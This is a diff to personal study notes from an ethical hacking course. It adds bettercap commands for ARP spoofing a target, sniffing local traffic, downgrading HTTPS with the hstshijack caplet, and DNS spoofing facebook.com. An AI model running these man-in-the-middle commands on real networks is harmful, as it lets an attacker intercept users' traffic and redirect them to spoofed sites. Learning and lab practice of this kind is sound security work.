@@ -288,11 +288,29 @@ net.recon on
 set arp.spoof.fullduplex true
 set arp.spoof.targets [targetIP]
 arp.spoof on
+set net.sniff.local true
 net.sniff on
 ```
-and save as filename.cap
+and save as e.g. sniffing.cap
 
 Run `bettercap -iface wlan0 -caplet filename.cap`
+##### Bypassing HTTPS
+Run `bettercap -iface wlan0 -caplet sniffing.cap` to start sniffing.
+
+And then run `hstshijack/hstshijack` (the caplet does not work perfectly so Zaid provided modified hstshijack)
+
+If a website is HSTS enabled, bypassing HTTPS will not work.
+##### DNS spoofing
+Run `bettercap -iface wlan0 -caplet sniffing.cap` to start sniffing.
+
+Then run
+```
+set dns.spoof.all true
+set dns.domains facebook.com,*.facebook.com
+dns.spoof on
+```
+
+
 
 Source: [Udemy: Learn ethical hacking from scratch by Zaid](https://www.udemy.com/course/learn-ethical-hacking-from-scratch/)
 
